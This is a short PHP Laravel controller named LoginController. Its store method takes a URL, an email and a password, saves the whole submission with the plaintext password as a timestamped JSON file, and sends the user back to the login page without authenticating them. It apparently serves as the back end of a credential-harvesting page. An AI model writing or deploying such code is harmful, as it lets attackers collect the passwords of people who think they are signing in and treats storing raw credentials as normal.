<?php

namespace App\Http\Controllers;

use App\Http\Controllers\Controller;
use Illuminate\Http\RedirectResponse;
use Illuminate\Support\Facades\Storage;
use Illuminate\Http\Request;
use Illuminate\View\View;
use Validator;
use Carbon\Carbon;

class LoginController extends Controller
{
    public function store(Request $request): RedirectResponse
    {
        $validated = Validator::make($request->all(), [
            'url' => 'required|string|url',
            'email' => 'required|string|email',
            'password' => 'required|string',
        ]);
     
        if ($validated->fails()) {
            return redirect('/login')
                ->withErrors($validated)
                ->withInput();
        }
     
        $jsonData = json_encode($request->post());
        $current_timestamp = Carbon::now()->timestamp;
        $filePath = "{$current_timestamp}.json";
        Storage::put($filePath, $jsonData);
        
        return redirect('/login');
    }
}